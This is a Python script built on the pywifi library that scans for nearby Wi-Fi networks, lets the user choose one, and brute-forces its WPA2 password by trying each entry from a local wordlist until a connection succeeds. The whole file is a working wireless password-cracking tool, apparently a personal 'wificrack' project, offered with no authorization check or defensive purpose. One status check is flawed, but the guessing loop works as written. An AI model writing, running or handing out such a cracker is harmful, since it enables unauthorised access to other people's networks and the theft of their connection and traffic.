import pywifi
from pywifi import const
import time

# Function to scan for available Wi-Fi networks and return a list of SSIDs
def scan_wifi():
    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]  # Get the first Wi-Fi interface

    iface.scan()
    time.sleep(2)  # Wait for the scan to complete 
    networks = iface.scan_results()
    return [net.ssid for net in networks]

# Function to connect to a Wi-Fi network using a password from the wordlist
def connect_to_wifi_with_password(ssid, password):
    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]  # Get the first Wi-Fi interface

    # Disconnect from any existing network
    iface.disconnect()
    
    # Wait for the interface to disconnect
    time.sleep(1)

    # Create a Wi-Fi profile
    profile = pywifi.Profile()
    profile.ssid = ssid  # Set the SSID
    profile.auth = const.AUTH_ALG_OPEN  # Set authentication algorithm
    profile.akm.append(const.AKM_TYPE_WPA2PSK)  # Set WPA2-PSK security
    profile.cipher = const.CIPHER_TYPE_CCMP  # Set encryption cipher (AES)
    profile.key = password  # Set the password from the wordlist

    # Add the profile
    tmp_profile = iface.add_network_profile(profile)

    # Connect to the Wi-Fi network
    iface.connect(tmp_profile)

    # Wait for the connection to establish
    time.sleep(5)

    # Check connection status
    if iface.status() == const.IFACE_CONNECTED:
        print("Connected to", ssid, "with password:", password)
        return True
    elif iface.status() == const.AUTH_ALG_OPEN:
        print("connected to", ssid , "open network", password)
        return True
    else:
        print("Failed to connect to", ssid, "with password:", password)
        return False

# Function to iterate through the wordlist and attempt to connect
def brute_force_wifi(ssid, wordlist_file):
    with open(wordlist_file, "r") as file:
        passwords = file.readlines()
        for password in passwords:
            password = password.strip()  # Remove leading/trailing whitespaces and newlines
            if connect_to_wifi_with_password(ssid, password):
                # If connected successfully, break the loop
                break

# Function to display available Wi-Fi networks and prompt user to select one
def select_wifi_network():
    print("Available Wi-Fi Networks:")
    networks = scan_wifi()
    for i, network in enumerate(networks, start=1):
        print(f"{i}. {network}")
    
    selection = int(input("Enter the number corresponding to the network you want to connect to: "))
    selected_network = networks[selection - 1]
    print(f"You selected: {selected_network}")
    return selected_network

# SSID (Wi-Fi network name) and path to the wordlist file
wordlist_file = "J:\\PROJECTS\\j\\projeect files\\wificrack\\wordlist.txt"  # Path to the wordlist file containing passwords

# Attempt to connect to the selected Wi-Fi network using the wordlist
selected_ssid = select_wifi_network()
brute_force_wifi(selected_ssid, wordlist_file)
